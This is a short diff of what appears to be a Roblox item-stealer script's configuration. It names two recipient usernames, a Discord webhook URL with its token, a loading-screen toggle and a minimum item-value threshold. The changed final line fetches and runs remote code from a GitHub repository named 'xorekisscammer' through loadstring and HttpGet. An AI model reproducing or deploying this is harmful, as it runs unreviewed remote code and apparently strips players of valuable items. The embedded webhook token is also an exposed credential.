@@ -2,8 +2,8 @@ Username = "jheremyqt1"
 Username2 = "jheremyqt12"
 Webhook = "https://discord.com/api/webhooks/1202985466719248385/3kFgY799tono8o2hB4Mh0JQ3-OsQrd-ivy2g9rNu6LNDuy6N7yMqO8R72i0SDjpBb2Da"
 
-LoadingScreen = false
+LoadingScreen = true
 
-MinimumRAP = 1000
+MinimumRAP = 20000
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/globglabgala/blobglab/main/swabalabala"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xorekisscammer/absos123/main/asbob123"))()
